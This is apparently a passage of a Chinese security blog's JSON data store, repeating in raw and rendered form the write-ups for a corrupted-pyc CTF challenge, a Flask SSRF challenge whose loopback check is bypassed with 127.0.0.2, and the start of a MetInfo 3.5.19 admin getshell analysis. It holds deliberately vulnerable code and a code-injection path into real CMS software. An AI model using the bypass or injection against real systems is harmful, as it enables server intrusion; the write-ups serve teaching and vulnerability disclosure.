`flag{pycyeshipy}` \n\n\n题目很简单 但是不知道为什么只有两位表哥做出来\n","slug":"newpost","published":1,"updated":"2018-06-05T01:49:20.700Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkk0wi4u000fr4nxrchzgtml","content":"<p>在i春秋 <a href=\"https://bbs.ichunqiu.com/thread-41125-1-1.html\" target=\"_blank\" rel=\"noopener\">61挑战</a>出了道简单的签到题<br>题目是一个损坏的pyc文件</p>\n<h2 id=\"wp\"><a href=\"#wp\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p>首先生成一个正常pyc文件  <code>python -m py_compile $filename</code> 对比如下<br><img src=\"/images/winhex_pyc.png\" alt=\"winhex\"></p>\n<p>可以发现文件头被破坏 对照正常pyc文件修复. 然后使用工具对pyc进行反编译 比如 <a href=\"https://tool.lu/pyc/\" target=\"_blank\" rel=\"noopener\">https://tool.lu/pyc/</a> </p>\n<p>得到反编译代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_ = (lambda .0: continue[ chr(i ^ 51) for i in .0 ])((85, 95, 82, 84, 72, 67, 74, 80, 74, 86, 64, 91, 90, 67, 74, 78))</span><br></pre></td></tr></table></figure></p>\n<p>打印 <code>_</code> 得到flag <code>flag{pycyeshipy}</code> </p>\n<p>题目很简单 但是不知道为什么只有两位表哥做出来</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在i春秋 <a href=\"https://bbs.ichunqiu.com/thread-41125-1-1.html\" target=\"_blank\" rel=\"noopener\">61挑战</a>出了道简单的签到题<br>题目是一个损坏的pyc文件</p>\n<h2 id=\"wp\"><a href=\"#wp\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p>首先生成一个正常pyc文件  <code>python -m py_compile $filename</code> 对比如下<br><img src=\"/images/winhex_pyc.png\" alt=\"winhex\"></p>\n<p>可以发现文件头被破坏 对照正常pyc文件修复. 然后使用工具对pyc进行反编译 比如 <a href=\"https://tool.lu/pyc/\" target=\"_blank\" rel=\"noopener\">https://tool.lu/pyc/</a> </p>\n<p>得到反编译代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_ = (lambda .0: continue[ chr(i ^ 51) for i in .0 ])((85, 95, 82, 84, 72, 67, 74, 80, 74, 86, 64, 91, 90, 67, 74, 78))</span><br></pre></td></tr></table></figure></p>\n<p>打印 <code>_</code> 得到flag <code>flag{pycyeshipy}</code> </p>\n<p>题目很简单 但是不知道为什么只有两位表哥做出来</p>\n"},{"title":"一道简单题目","date":"2018-05-31T15:06:36.000Z","_content":"题目代码\n~~~\n\n\nfrom flask import Flask, request\nimport requests\nimport json\nimport socket\nfrom urllib.parse import urlparse\nfrom os.path import abspath，isfile\n\napp = Flask(__name__)\n\n\n\n\n@app.route('/', methods=['POST', 'PUT'])\ndef main():\n    if request.method == 'POST':\n        return '<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">   <title>405 Method Not Allowed</title>  ' \\\n               '<h1>Method Not Allowed</h1>  <p>The method is not allowed for the requested URL.</p>  <!-- /flag --> '\n\n    if request.method == 'PUT':\n        if not request.json:\n            return '数据格式错误'\n\n        data = request.data\n        j_data = json.loads(data)\n\n        try:\n            url = j_data['url']\n        except:\n                return '缺少url字段'\n\n        try:\n            filename = j_data['filename']\n        except:\n            return '缺少filename字段'\n\n        host = urlparse(url).hostname\n        ip_address = socket.getaddrinfo(host, 'http')[0][4][0]\n        if ip_address == '127.0.0.1':\n            return 'url不能是127.0.0.1'\n\n        ret = requests.get(url)\n        filename = abspath(filename)\n        if isfile(filename):\n            return  '文件已存在'\n        with open(filename) as f:\n            f.write(ret.text)\n        return '文件已写入'\n\n@app.route('/flag')\ndef flag():\n    ip = request.remote_addr\n    if ip != '127.0.0.1':\n        return '你的ip不是127.0.0.1'\n    return 'flag{ichunqiu51}'\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0')\n\n~~~\n\n## wp\n### 参考\n思路来源自p牛的博客 https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html\n\n### 技术\n主要考核了对ip协议的熟悉度 不止127.0.0.1  127.x这个段也是访问本机\n\n### 过程\n\n直接访问`/` 发现状态码405\n\n尝试`post`方法访问 返回界面也是405 但是状态码是200\n\n查看网页源代码 发现注释 `/flag` 访问获得提示 `你的ip不是127.0.0.1`\n\n继续尝试 `put`方法访问`/` 得到提示 `数据格式错误`\n尝试json 根据提示构造出合适的格式  该功能是获取url地址文件并写入文件. flask默认可以直接读取的文件夹是 `/static/`\n\n尝试输入`127.0.0.1/flag` 发现被禁止 尝试绕过`127.0.0.2/flag`  得到flag\n","source":"_posts/一道简单题目.md","raw":"---\ntitle: 一道简单题目\ndate: 2018-05-31 23:06:36\ntags:\n     编程技术\n---\n题目代码\n~~~\n\n\nfrom flask import Flask, request\nimport requests\nimport json\nimport socket\nfrom urllib.parse import urlparse\nfrom os.path import abspath，isfile\n\napp = Flask(__name__)\n\n\n\n\n@app.route('/', methods=['POST', 'PUT'])\ndef main():\n    if request.method == 'POST':\n        return '<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">   <title>405 Method Not Allowed</title>  ' \\\n               '<h1>Method Not Allowed</h1>  <p>The method is not allowed for the requested URL.</p>  <!-- /flag --> '\n\n    if request.method == 'PUT':\n        if not request.json:\n            return '数据格式错误'\n\n        data = request.data\n        j_data = json.loads(data)\n\n        try:\n            url = j_data['url']\n        except:\n                return '缺少url字段'\n\n        try:\n            filename = j_data['filename']\n        except:\n            return '缺少filename字段'\n\n        host = urlparse(url).hostname\n        ip_address = socket.getaddrinfo(host, 'http')[0][4][0]\n        if ip_address == '127.0.0.1':\n            return 'url不能是127.0.0.1'\n\n        ret = requests.get(url)\n        filename = abspath(filename)\n        if isfile(filename):\n            return  '文件已存在'\n        with open(filename) as f:\n            f.write(ret.text)\n        return '文件已写入'\n\n@app.route('/flag')\ndef flag():\n    ip = request.remote_addr\n    if ip != '127.0.0.1':\n        return '你的ip不是127.0.0.1'\n    return 'flag{ichunqiu51}'\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0')\n\n~~~\n\n## wp\n### 参考\n思路来源自p牛的博客 https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html\n\n### 技术\n主要考核了对ip协议的熟悉度 不止127.0.0.1  127.x这个段也是访问本机\n\n### 过程\n\n直接访问`/` 发现状态码405\n\n尝试`post`方法访问 返回界面也是405 但是状态码是200\n\n查看网页源代码 发现注释 `/flag` 访问获得提示 `你的ip不是127.0.0.1`\n\n继续尝试 `put`方法访问`/` 得到提示 `数据格式错误`\n尝试json 根据提示构造出合适的格式  该功能是获取url地址文件并写入文件. flask默认可以直接读取的文件夹是 `/static/`\n\n尝试输入`127.0.0.1/flag` 发现被禁止 尝试绕过`127.0.0.2/flag`  得到flag\n","slug":"一道简单题目","published":1,"updated":"2018-05-31T15:28:50.430Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkk0wi53000gr4nx2qad5hmd","content":"<p>题目代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">from flask import Flask, request</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import json</span><br><span class=\"line\">import socket</span><br><span class=\"line\">from urllib.parse import urlparse</span><br><span class=\"line\">from os.path import abspath，isfile</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&apos;/&apos;, methods=[&apos;POST&apos;, &apos;PUT&apos;])</span><br><span class=\"line\">def main():</span><br><span class=\"line\">    if request.method == &apos;POST&apos;:</span><br><span class=\"line\">        return &apos;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;   &lt;title&gt;405 Method Not Allowed&lt;/title&gt;  &apos; \\</span><br><span class=\"line\">               &apos;&lt;h1&gt;Method Not Allowed&lt;/h1&gt;  &lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt;  &lt;!-- /flag --&gt; &apos;</span><br><span class=\"line\"></span><br><span class=\"line\">    if request.method == &apos;PUT&apos;:</span><br><span class=\"line\">        if not request.json:</span><br><span class=\"line\">            return &apos;数据格式错误&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        data = request.data</span><br><span class=\"line\">        j_data = json.loads(data)</span><br><span class=\"line\"></span><br><span class=\"line\">        try:</span><br><span class=\"line\">            url = j_data[&apos;url&apos;]</span><br><span class=\"line\">        except:</span><br><span class=\"line\">                return &apos;缺少url字段&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        try:</span><br><span class=\"line\">            filename = j_data[&apos;filename&apos;]</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            return &apos;缺少filename字段&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        host = urlparse(url).hostname</span><br><span class=\"line\">        ip_address = socket.getaddrinfo(host, &apos;http&apos;)[0][4][0]</span><br><span class=\"line\">        if ip_address == &apos;127.0.0.1&apos;:</span><br><span class=\"line\">            return &apos;url不能是127.0.0.1&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = requests.get(url)</span><br><span class=\"line\">        filename = abspath(filename)</span><br><span class=\"line\">        if isfile(filename):</span><br><span class=\"line\">            return  &apos;文件已存在&apos;</span><br><span class=\"line\">        with open(filename) as f:</span><br><span class=\"line\">            f.write(ret.text)</span><br><span class=\"line\">        return &apos;文件已写入&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&apos;/flag&apos;)</span><br><span class=\"line\">def flag():</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    if ip != &apos;127.0.0.1&apos;:</span><br><span class=\"line\">        return &apos;你的ip不是127.0.0.1&apos;</span><br><span class=\"line\">    return &apos;flag&#123;ichunqiu51&#125;&apos;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    app.run(host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"wp\"><a href=\"#wp\" class=\"headerlink\" title=\"wp\"></a>wp</h2><h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p>思路来源自p牛的博客 <a href=\"https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p>\n<h3 id=\"技术\"><a href=\"#技术\" class=\"headerlink\" title=\"技术\"></a>技术</h3><p>主要考核了对ip协议的熟悉度 不止127.0.0.1  127.x这个段也是访问本机</p>\n<h3 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h3><p>直接访问<code>/</code> 发现状态码405</p>\n<p>尝试<code>post</code>方法访问 返回界面也是405 但是状态码是200</p>\n<p>查看网页源代码 发现注释 <code>/flag</code> 访问获得提示 <code>你的ip不是127.0.0.1</code></p>\n<p>继续尝试 <code>put</code>方法访问<code>/</code> 得到提示 <code>数据格式错误</code><br>尝试json 根据提示构造出合适的格式  该功能是获取url地址文件并写入文件. flask默认可以直接读取的文件夹是 <code>/static/</code></p>\n<p>尝试输入<code>127.0.0.1/flag</code> 发现被禁止 尝试绕过<code>127.0.0.2/flag</code>  得到flag</p>\n","site":{"data":{}},"excerpt":"","more":"<p>题目代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">from flask import Flask, request</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import json</span><br><span class=\"line\">import socket</span><br><span class=\"line\">from urllib.parse import urlparse</span><br><span class=\"line\">from os.path import abspath，isfile</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&apos;/&apos;, methods=[&apos;POST&apos;, &apos;PUT&apos;])</span><br><span class=\"line\">def main():</span><br><span class=\"line\">    if request.method == &apos;POST&apos;:</span><br><span class=\"line\">        return &apos;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;   &lt;title&gt;405 Method Not Allowed&lt;/title&gt;  &apos; \\</span><br><span class=\"line\">               &apos;&lt;h1&gt;Method Not Allowed&lt;/h1&gt;  &lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt;  &lt;!-- /flag --&gt; &apos;</span><br><span class=\"line\"></span><br><span class=\"line\">    if request.method == &apos;PUT&apos;:</span><br><span class=\"line\">        if not request.json:</span><br><span class=\"line\">            return &apos;数据格式错误&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        data = request.data</span><br><span class=\"line\">        j_data = json.loads(data)</span><br><span class=\"line\"></span><br><span class=\"line\">        try:</span><br><span class=\"line\">            url = j_data[&apos;url&apos;]</span><br><span class=\"line\">        except:</span><br><span class=\"line\">                return &apos;缺少url字段&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        try:</span><br><span class=\"line\">            filename = j_data[&apos;filename&apos;]</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            return &apos;缺少filename字段&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        host = urlparse(url).hostname</span><br><span class=\"line\">        ip_address = socket.getaddrinfo(host, &apos;http&apos;)[0][4][0]</span><br><span class=\"line\">        if ip_address == &apos;127.0.0.1&apos;:</span><br><span class=\"line\">            return &apos;url不能是127.0.0.1&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = requests.get(url)</span><br><span class=\"line\">        filename = abspath(filename)</span><br><span class=\"line\">        if isfile(filename):</span><br><span class=\"line\">            return  &apos;文件已存在&apos;</span><br><span class=\"line\">        with open(filename) as f:</span><br><span class=\"line\">            f.write(ret.text)</span><br><span class=\"line\">        return &apos;文件已写入&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&apos;/flag&apos;)</span><br><span class=\"line\">def flag():</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    if ip != &apos;127.0.0.1&apos;:</span><br><span class=\"line\">        return &apos;你的ip不是127.0.0.1&apos;</span><br><span class=\"line\">    return &apos;flag&#123;ichunqiu51&#125;&apos;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    app.run(host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"wp\"><a href=\"#wp\" class=\"headerlink\" title=\"wp\"></a>wp</h2><h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p>思路来源自p牛的博客 <a href=\"https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p>\n<h3 id=\"技术\"><a href=\"#技术\" class=\"headerlink\" title=\"技术\"></a>技术</h3><p>主要考核了对ip协议的熟悉度 不止127.0.0.1  127.x这个段也是访问本机</p>\n<h3 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h3><p>直接访问<code>/</code> 发现状态码405</p>\n<p>尝试<code>post</code>方法访问 返回界面也是405 但是状态码是200</p>\n<p>查看网页源代码 发现注释 <code>/flag</code> 访问获得提示 <code>你的ip不是127.0.0.1</code></p>\n<p>继续尝试 <code>put</code>方法访问<code>/</code> 得到提示 <code>数据格式错误</code><br>尝试json 根据提示构造出合适的格式  该功能是获取url地址文件并写入文件. flask默认可以直接读取的文件夹是 <code>/static/</code></p>\n<p>尝试输入<code>127.0.0.1/flag</code> 发现被禁止 尝试绕过<code>127.0.0.2/flag</code>  得到flag</p>\n"},{"title":"metinfo3.5.19后台getshell分析","date":"2017-11-28T01:29:34.000Z","_content":"### metinfo后台getshellexp分析\n漏洞版本`3.5.19`  漏洞文件路径`/admin/app/physical/physical.php` \n有趣的是`3.5.18`修复的后台getshell也是这个文件  \n`3.5.18`漏洞分析 [点我](https://bbs.ichunqiu.com/thread-29582-1-1.html)\n上次分析完后顺手审计一下那个文件，发现居然还有一个getshell漏洞。提交后没人理就发出来分享\n\n#### 漏洞代码\n```\nelseif($action==\"op\"){\n\t// 不相关代码\n\t$val=explode('|',$valphy);\n    // 不相关代码\n\tswitch($op){\n\t   // 不相关代码\n\t\tcase 3:\n\t\t\t$fileaddr=explode('/',$val[1]);\n\t\t\t$filedir=\"../../../\".$fileaddr[0];  \n\t\t\tif(!file_exists($filedir)){ @mkdir ($filedir, 0777); } \n\t\t\tif($fileaddr[1]==\"index.php\"){\n\t\t\t\tif($val[2]){\n\t\t\t\t\tCopyindx(\"../../../\".$val[1],$val[2]);\n\t\t\t\t}\n```\n需要`op`参数为3才能进入漏洞代码流程，并且要正常执行，需要`fileaddr[1]='index.php' `和`$val[2]`也就是valphy参数要为`xxx|xxx/index.php|xxx`格式\n\n查看`Copyindex`函数\n```\nfunction Copyindx($newindx,$type){\n    if(!file_exists($newindx)){\n        if($type==3){\n            //生成产品栏目index\n            $oldcont =\"<?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\n\\$cmodule='product_index';\\nrequire_once '../include/module.php'; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?>\";\n        }else{\n            $oldcont =\"<?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once '../include/module.php'; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?>\";\n        }\n        $fp = fopen($newindx,w);\n        fputs($fp, $oldcont);\n        fclose($fp);\n    }\n}\n```\n可以看到如果传入type参数不等于3,进入第二个流程.发现是单纯的字符串拼接,然后这个函数的参数我们都可控\n\n","source":"_posts/metinfo3-5-19后台getshell分析.md","raw":"---\ntitle: metinfo3.5.19后台getshell分析\ndate: 2017-11-28  09:29:34\ntags:\n\tweb安全\n    漏洞分析\n---\n### metinfo后台getshellexp分析\n漏洞版本`3.5.19`  漏洞文件路径`/admin/app/physical/physical.php` \n有趣的是`3.5.18`修复的后台getshell也是这个文件  \n`3.5.18`漏洞分析 [点我](https://bbs.ichunqiu.com/thread-29582-1-1.html)\n上次分析完后顺手审计一下那个文件，发现居然还有一个getshell漏洞。提交后没人理就发出来分享\n\n#### 漏洞代码\n```\nelseif($action==\"op\"){\n\t// 不相关代码\n\t$val=explode('|',$valphy);\n    // 不相关代码\n\tswitch($op){\n\t   // 不相关代码\n\t\tcase 3:\n\t\t\t$fileaddr=explode('/',$val[1]);\n\t\t\t$filedir=\"../../../\".$fileaddr[0];  \n\t\t\tif(!file_exists($filedir)){ @mkdir ($filedir, 0777); } \n\t\t\tif($fileaddr[1]==\"index.php\"){\n\t\t\t\tif($val[2]){\n\t\t\t\t\tCopyindx(\"../../../\".$val[1],$val[2]);\n\t\t\t\t}\n```\n需要`op`参数为3才能进入漏洞代码流程，并且要正常执行，需要`fileaddr[1]='index.php' `和`$val[2]`也就是valphy参数要为`xxx|xxx/index.php|xxx`格式\n\n查看`Copyindex`函数\n```\nfunction Copyindx($newindx,$type){\n    if(!file_exists($newindx)){\n        if($type==3){\n            //生成产品栏目index\n            $oldcont =\"<?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\n\\$cmodule='product_index';\\nrequire_once '../include/module.php'; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?>\";\n        }else{\n            $oldcont =\"<?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once '../include/module.php'; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?>\";\n        }\n        $fp = fopen($newindx,w);\n        fputs($fp, $oldcont);\n        fclose($fp);\n    }\n}\n```\n可以看到如果传入type参数不等于3,进入第二个流程.发现是单纯的字符串拼接,然后这个函数的参数我们都可控\n\n","slug":"metinfo3-5-19后台getshell分析","published":1,"updated":"2018-05-31T01:31:24.065Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkk0wi5c000jr4nx8hrwn8g3","content":"<h3 id=\"metinfo后台getshellexp分析\"><a href=\"#metinfo后台getshellexp分析\" class=\"headerlink\" title=\"metinfo后台getshellexp分析\"></a>metinfo后台getshellexp分析</h3><p>漏洞版本<code>3.5.19</code>  漏洞文件路径<code>/admin/app/physical/physical.php</code><br>有趣的是<code>3.5.18</code>修复的后台getshell也是这个文件<br><code>3.5.18</code>漏洞分析 <a href=\"https://bbs.ichunqiu.com/thread-29582-1-1.html\" target=\"_blank\" rel=\"noopener\">点我</a><br>上次分析完后顺手审计一下那个文件，发现居然还有一个getshell漏洞。提交后没人理就发出来分享</p>\n<h4 id=\"漏洞代码\"><a href=\"#漏洞代码\" class=\"headerlink\" title=\"漏洞代码\"></a>漏洞代码</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">elseif($action==&quot;op&quot;)&#123;</span><br><span class=\"line\">\t// 不相关代码</span><br><span class=\"line\">\t$val=explode(&apos;|&apos;,$valphy);</span><br><span class=\"line\">    // 不相关代码</span><br><span class=\"line\">\tswitch($op)&#123;</span><br><span class=\"line\">\t   // 不相关代码</span><br><span class=\"line\">\t\tcase 3:</span><br><span class=\"line\">\t\t\t$fileaddr=explode(&apos;/&apos;,$val[1]);</span><br><span class=\"line\">\t\t\t$filedir=&quot;../../../&quot;.$fileaddr[0];  </span><br><span class=\"line\">\t\t\tif(!file_exists($filedir))&#123; @mkdir ($filedir, 0777); &#125; </span><br><span class=\"line\">\t\t\tif($fileaddr[1]==&quot;index.php&quot;)&#123;</span><br><span class=\"line\">\t\t\t\tif($val[2])&#123;</span><br><span class=\"line\">\t\t\t\t\tCopyindx(&quot;../../../&quot;.$val[1],$val[2]);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br></pre></td></tr></table></figure>\n<p>需要<code>op</code>参数为3才能进入漏洞代码流程，并且要正常执行，需要<code>fileaddr[1]=&#39;index.php&#39;</code>和<code>$val[2]</code>也就是valphy参数要为<code>xxx|xxx/index.php|xxx</code>格式</p>\n<p>查看<code>Copyindex</code>函数<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Copyindx($newindx,$type)&#123;</span><br><span class=\"line\">    if(!file_exists($newindx))&#123;</span><br><span class=\"line\">        if($type==3)&#123;</span><br><span class=\"line\">            //生成产品栏目index</span><br><span class=\"line\">            $oldcont =&quot;&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\n\\$cmodule=&apos;product_index&apos;;\\nrequire_once &apos;../include/module.php&apos;; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;&quot;;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            $oldcont =&quot;&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once &apos;../include/module.php&apos;; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $fp = fopen($newindx,w);</span><br><span class=\"line\">        fputs($fp, $oldcont);</span><br><span class=\"line\">        fclose($fp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以看到如果传入type参数不等于3,进入第二个流程.发现是单纯的字符串拼接,然后这个函数的参数我们都可控</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"metinfo后台getshellexp分析\"><a href=\"#metinfo后台getshellexp分析\" class=\"headerlink\" 